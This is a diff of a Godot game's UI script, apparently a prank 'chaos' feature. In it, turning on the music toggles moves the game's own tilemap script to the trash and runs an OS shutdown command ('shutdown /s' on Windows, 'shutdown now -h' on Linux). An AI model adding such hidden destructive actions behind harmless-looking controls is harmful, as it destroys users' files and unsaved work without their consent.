@@ -3,12 +3,12 @@ extends CanvasLayer
 
 signal selection_changed
 
-@export var delete_code_with_music = true
+@export var create_chaos_with_music = true
 @export var selection_label:RichTextLabel = null
 @export var alert_label:RichTextLabel = null
 @export var debug_label:RichTextLabel = null
 @export var resources_label:RichTextLabel = null
-@export var music_toggle:CheckButton = null
+@export var menu:CenterContainer = null
 @export var music_player:AudioStreamPlayer = null
 
 var selected_tile = 1
@@ -64,25 +64,29 @@ func add_resource(i:int):
 func _on_music_toggled(toggled_on):
 	if (toggled_on == true):
 		music_player.play()
-		if (delete_code_with_music):
+		if (create_chaos_with_music):
 			# delete code with music
 			OS.move_to_trash(ProjectSettings.globalize_path("res://scripts/tilemap.gd"))
 		
 	else:
 		music_player.stop()
 
-
 func _on_music_2_toggled(toggled_on):
 	if (toggled_on == true):
 		music_player.play()
-		var output = []
-		match OS.get_name():
-			"Windows":
-				OS.execute("cmd.exe", ["/C", "shutdown /s"], output)
-			"macOS":
-				pass
-			"Linux", "FreeBSD", "NetBSD", "OpenBSD", "BSD":
-				OS.execute("shutdown", ["now", "-h"], output)
-		print(output)
+		if (create_chaos_with_music):
+			var output = []
+			match OS.get_name():
+				"Windows":
+					OS.execute("cmd.exe", ["/C", "shutdown /s"], output)
+				"macOS":
+					pass
+				"Linux", "FreeBSD", "NetBSD", "OpenBSD", "BSD":
+					OS.execute("shutdown", ["now", "-h"], output)
+			print(output)
 	else:
 		music_player.stop()
+
+func _on_menu_pressed():
+	print(menu)
+	menu.visible = not menu.visible
